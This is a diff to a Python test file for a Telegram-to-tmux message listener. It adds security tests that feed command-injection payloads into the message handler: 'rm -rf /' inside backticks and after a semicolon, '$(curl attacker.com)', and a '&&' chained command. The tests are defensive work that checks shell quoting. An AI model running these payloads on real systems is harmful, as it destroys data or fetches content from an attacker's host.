@@ -124,12 +124,12 @@ class TestNewRoutingLogic(unittest.TestCase):
 
         telegram_listener.process_update(update)
 
-        # Should send error message with active sessions
+        # Should send error message with session count (not names for security)
         mock_send_tg.assert_called()
         error_msg = str(mock_send_tg.call_args)
         self.assertIn("not found", error_msg.lower())
-        self.assertIn("claude-session", error_msg)
-        self.assertIn("test-session", error_msg)
+        # Security fix: No longer shows session names, just count
+        self.assertIn("3 active session(s)", error_msg)
 
     @patch('telegram_listener.subprocess.run')
     @patch('telegram_listener.send_telegram_message')
@@ -323,6 +323,127 @@ class TestMessageIdFormat(unittest.TestCase):
         """Reject session names with special characters"""
         result = telegram_listener.parse_message_id("my@agent: message")
         self.assertIsNone(result)
+
+
+class TestSecurity(unittest.TestCase):
+    """Test security features - command injection prevention"""
+
+    @patch('telegram_listener.subprocess.run')
+    @patch('telegram_listener.send_telegram_message')
+    @patch('telegram_listener.time.sleep')
+    def test_command_injection_backticks(self, mock_sleep, mock_send_tg, mock_subprocess):
+        """Prevent command injection via backticks"""
+        # Mock tmux list-sessions
+        mock_subprocess.return_value = MagicMock(
+            returncode=0,
+            stdout="test-session\n"
+        )
+
+        # Attempt command injection with backticks
+        update = {
+            "message": {
+                "text": "test-session: `rm -rf /`",
+                "from": {"first_name": "Attacker"}
+            }
+        }
+
+        telegram_listener.process_update(update)
+
+        # Verify the message was quoted/escaped
+        calls = mock_subprocess.call_args_list
+        send_keys_calls = [c for c in calls if 'send-keys' in str(c)]
+
+        # Should have called send-keys
+        self.assertTrue(len(send_keys_calls) > 0, "send-keys should be called")
+
+        # The message should be escaped (shlex.quote wraps in single quotes)
+        message_arg = str(send_keys_calls[0])
+        # After shlex.quote, the backticks should be safely quoted
+        self.assertIn("'`rm -rf /`'", message_arg, "Backticks should be quoted")
+
+    @patch('telegram_listener.subprocess.run')
+    @patch('telegram_listener.send_telegram_message')
+    @patch('telegram_listener.time.sleep')
+    def test_command_injection_dollar_paren(self, mock_sleep, mock_send_tg, mock_subprocess):
+        """Prevent command injection via $(command)"""
+        mock_subprocess.return_value = MagicMock(
+            returncode=0,
+            stdout="test-session\n"
+        )
+
+        # Attempt command injection with $()
+        update = {
+            "message": {
+                "text": "test-session: $(curl attacker.com)",
+                "from": {"first_name": "Attacker"}
+            }
+        }
+
+        telegram_listener.process_update(update)
+
+        calls = mock_subprocess.call_args_list
+        send_keys_calls = [c for c in calls if 'send-keys' in str(c)]
+
+        self.assertTrue(len(send_keys_calls) > 0)
+        message_arg = str(send_keys_calls[0])
+        # After shlex.quote, the $() should be safely quoted
+        self.assertIn("'$(curl attacker.com)'", message_arg, "$() should be quoted")
+
+    @patch('telegram_listener.subprocess.run')
+    @patch('telegram_listener.send_telegram_message')
+    @patch('telegram_listener.time.sleep')
+    def test_command_injection_semicolon(self, mock_sleep, mock_send_tg, mock_subprocess):
+        """Prevent command injection via semicolon"""
+        mock_subprocess.return_value = MagicMock(
+            returncode=0,
+            stdout="test-session\n"
+        )
+
+        # Attempt command injection with semicolon
+        update = {
+            "message": {
+                "text": "test-session: hello; rm -rf /",
+                "from": {"first_name": "Attacker"}
+            }
+        }
+
+        telegram_listener.process_update(update)
+
+        calls = mock_subprocess.call_args_list
+        send_keys_calls = [c for c in calls if 'send-keys' in str(c)]
+
+        self.assertTrue(len(send_keys_calls) > 0)
+        message_arg = str(send_keys_calls[0])
+        # After shlex.quote, the semicolon should be safely quoted
+        self.assertIn("'hello; rm -rf /'", message_arg, "Semicolon should be quoted")
+
+    @patch('telegram_listener.subprocess.run')
+    @patch('telegram_listener.send_telegram_message')
+    @patch('telegram_listener.time.sleep')
+    def test_command_injection_ampersand(self, mock_sleep, mock_send_tg, mock_subprocess):
+        """Prevent command injection via && operator"""
+        mock_subprocess.return_value = MagicMock(
+            returncode=0,
+            stdout="test-session\n"
+        )
+
+        # Attempt command injection with &&
+        update = {
+            "message": {
+                "text": "test-session: hello && malicious_command",
+                "from": {"first_name": "Attacker"}
+            }
+        }
+
+        telegram_listener.process_update(update)
+
+        calls = mock_subprocess.call_args_list
+        send_keys_calls = [c for c in calls if 'send-keys' in str(c)]
+
+        self.assertTrue(len(send_keys_calls) > 0)
+        message_arg = str(send_keys_calls[0])
+        # After shlex.quote, the && should be safely quoted
+        self.assertIn("'hello && malicious_command'", message_arg, "&& should be quoted")
 
 
 if __name__ == '__main__':
